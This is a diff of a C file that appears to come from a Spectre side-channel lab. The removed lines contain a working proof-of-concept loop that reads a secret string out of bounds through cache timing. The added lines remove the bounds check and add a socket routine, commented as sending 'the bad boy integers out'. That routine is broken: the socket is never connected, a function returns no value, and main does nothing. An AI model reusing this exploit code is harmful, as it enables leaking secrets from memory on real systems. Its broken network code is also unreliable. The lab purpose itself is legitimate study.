@@ -3,6 +3,20 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <stdint.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+
+#define MAX 80 
+#define PORT 8080 
+#define SA struct sockaddr 
+
+#define CACHE_HIT_THRESHOLD (200)
+#define DELTA 1024
+#define STRLEN 8
+
 
 unsigned int buffer_size = 10;
 uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
@@ -11,18 +25,28 @@ char *secret = "Some Secret Value";
 uint8_t array[256*4096];
 uint8_t scores[256];
 
-#define CACHE_HIT_THRESHOLD (95)
-#define DELTA 1024
-#define STRLEN 8
+int sockfd, connfd;
+struct sockaddr_in servaddr, cli;
+
+void func(int sockfd, size_t x)
+{
+    char buff[MAX];
+    int n;
+    sprintf(buff, "%d", x);
+    write(sockfd, buff, sizeof(buff));
+    bzero(buff, sizeof(buff));
+    read(sockfd, buff, sizeof(buff));
+    //printf("Buffer: %s\n", buff);
+}
+
 
 // Sandbox Function
 uint8_t restrictedAccess(size_t x)
 {
-  if (x < buffer_size) {
-     return buffer[x];
-  } else {
-     return 0;
-  } 
+  //Make network connection and send the bad boy integers out
+
+    // function for chat 
+    func(sockfd, x);
 }
 
 void flushSideChannel()
@@ -72,51 +96,6 @@ void spectreAttack(size_t larger_x)
 }
 
 int main() {
-  flushSideChannel();
-  size_t larger_x = (size_t)(secret - (char*)buffer);  
-  printf("0x%p\n", larger_x);
-  int consecutive_chars = 0;
-  char tmpstr[STRLEN+1];
-  for(int i = 0; i < 327680; i++){
-    for(int j = 0; j < 256; j++){
-      scores[j] = 0;
-    }
-    for(int j = 0; j < 1000; j++){
-      spectreAttack(larger_x + i);
-      reloadSideChannel();
-    }
-    int max = 0;
-    for(int j = 0; j < 256; j++){
-      if(scores[max] < scores[j]){
-        max = j;
-      }
-    }
-    
-    if(max >= 32 && max <= 126){
-      tmpstr[consecutive_chars] = max;
-      consecutive_chars+=1;
-      if(consecutive_chars >= STRLEN){
-        tmpstr[consecutive_chars] = '\x00'; 
-        printf("(%p) %s\n", (larger_x + i), tmpstr);
-
-        memset(tmpstr, '\x00', STRLEN);
-        consecutive_chars = 0;
-      }
-    } else {
-      if(consecutive_chars > 0){
-        memset(tmpstr, '\x00', STRLEN+1);
-        consecutive_chars = 0;
-      }
-    }
-/*
-    if(max >= 32 && max <= 126){
-      printf("  %c ", max);
-    } else {
-      printf("\\x%02x", max);
-    }
-    if(i % 18 == 17){ printf("\n"); }
-*/
-  }
-  printf("\n");
+   
   return 0;
 }
